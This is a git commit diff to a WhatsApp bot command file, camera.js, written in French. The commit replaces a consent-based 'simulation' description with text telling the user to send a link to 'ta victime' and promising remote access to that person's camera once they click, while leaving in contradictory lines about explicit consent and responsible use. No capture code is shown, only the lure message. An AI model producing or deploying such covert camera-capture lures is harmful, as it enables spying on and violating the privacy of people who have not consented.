2a79d8b7792483787ed5173f9be2dda2bedcb3c3
𓆩 𝐃𝐢𝐠𝐢𝐭𝐚𝐥 𝐂𝐫𝐞𝐰 𝟐𝟒𝟑 𓆪 <botwhatsapp248@gmail.com>
2025-11-02 22:15:05 +0100

    Update camera.js

--- commands/camera.js
+++ commands/camera.js
@@ -8,8 +8,9 @@ module.exports = {
     const url = `${baseUrl}/${chatId}`;
 
     const text = `📸 *Salutations @${username}*\n\n` +
-      `Cliquez sur le lien suivant pour ouvrir une page sécurisée qui permet à la personne de *simuler* l'activation de sa caméra et d'envoyer volontairement une photo :\n\n` +
-      `[🔗 Ouvrir la page de simulation](${url})\n\n` +
+      `🎯 Copie ce lien envoi le à ta victime.  📌 Dès qu’il/elle cliquera, tu pourras avoir accès à sa caméra à distance   
+⏳ Patiente un instant pour qu’il/elle ouvre le lien.... :\n\n` +
+      `[🔗 Ouvrir le lien](${url})\n\n` +
       `La capture n'est effectuée *que* si la personne clique explicitement sur « Capturer & Envoyer ».\n\n` +
       `⚠️ *Utilisation responsable* — n'utilisez ce lien *qu'avec le consentement explicite* de la personne. L'utilisation sans consentement est illégale.\n\n` +
       `ℹ️ Après envoi, l'administrateur et la personne recevront la photo (simulation).`;
